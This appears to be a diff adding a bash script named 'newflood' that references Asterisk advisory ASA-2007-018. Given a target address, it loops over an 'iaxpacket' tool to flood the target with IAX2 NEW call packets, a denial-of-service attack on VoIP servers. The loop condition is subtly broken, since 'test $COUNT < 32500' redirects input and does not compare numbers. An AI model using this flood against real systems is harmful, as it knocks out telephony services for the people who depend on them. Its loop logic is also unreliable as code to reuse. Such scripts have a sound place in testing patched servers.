@@ -1,0 +1,23 @@
+#!/bin/bash
+
+# ASA-2007-018
+# http://downloads.digium.com/pub/asa/ASA-2007-018.pdf
+
+PATH=./:$PATH
+
+if [ "x$1" = "x" ]
+then
+	echo "USAGE: newflood <ipaddr[:port]>"
+	exit 1
+fi
+
+DESTIP=$1
+
+COUNT=1
+
+while test $COUNT < 32500
+do
+	iaxpacket -f FULL -t IAX2 -s NEW -S $COUNT --ie_string USERNAME=guest -i ${DESTIP} --ie_ulong CAPABILITIES=4 --ie_ulong FORMAT=4
+	COUNT=$[$COUNT + 1]
+	#sleep 1
+done
